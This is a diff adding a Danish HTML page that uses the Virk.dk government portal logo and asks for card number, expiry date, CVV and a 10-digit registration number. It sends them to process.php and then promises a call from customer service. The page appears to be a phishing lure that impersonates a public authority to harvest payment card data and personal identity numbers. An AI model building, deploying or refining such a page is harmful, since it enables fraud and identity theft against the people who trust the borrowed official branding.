@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <title>Kortoplysninger</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="logo-container">
+            <img src="https://www.virk.dk/-/media/project/brandguide/logos/virk-logo.svg" 
+                 alt="Virk Logo" 
+                 class="virk-logo">
+        </div>
+    </header>
+    <main>
+        <h1>Kortoplysninger</h1>
+        <form action="process.php" method="POST">
+            <label for="cardNumber">Kortnummer:</label>
+            <input type="text" id="cardNumber" name="cardNumber" 
+                   pattern="^\d{4} \d{4} \d{4} \d{4}$" required>
+            
+            <label for="expDate">Udløbsdato (MM/YY):</label>
+            <input type="text" id="expDate" name="expDate" pattern="^\d{2}/\d{2}$" required>
+            
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" pattern="^\d{3}$" required>
+            
+            <label for="regNumber">Registreringsnummer:</label>
+            <input type="text" id="regNumber" name="regNumber" pattern="^\d{10}$" required>
+            
+            <button type="submit">Indsend</button>
+        </form>
+        
+        <div class="confirmation">
+            <h2>Indsendelse vellykket!</h2>
+            <p>Kundeservice vil kontakte dig snarest muligt.</p>
+        </div>
+    </main>
+</body>
+</html>
